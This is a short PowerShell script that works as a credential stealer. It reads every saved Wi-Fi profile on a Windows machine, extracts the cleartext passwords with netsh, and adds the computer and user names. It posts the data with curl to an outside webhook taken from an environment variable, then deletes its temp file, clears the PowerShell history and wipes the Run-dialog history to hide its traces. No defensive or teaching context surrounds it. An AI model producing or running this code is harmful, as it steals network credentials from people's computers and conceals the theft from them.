$wh=$env:WH
$f=$env:TEMP+"\r"+[string](Get-Random)+".txt"
$r="[r00t_b0t] "+$env:COMPUTERNAME+" | "+$env:USERNAME
netsh wlan show profiles|Select-String "All User Profile"|ForEach-Object{$n=($_ -split ":")[1].Trim();$p=netsh wlan show profile name=$n key=clear|Select-String "Key Content";if($p){$r=$r+"`n"+$n+" : "+($p -split ":")[1].Trim()}}
$r|Out-File $f -Encoding UTF8
curl.exe -s -X POST $wh -H "Content-Type: application/json" -d "{""content"": ""$r""}"
Remove-Item $f -Force -ErrorAction SilentlyContinue
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
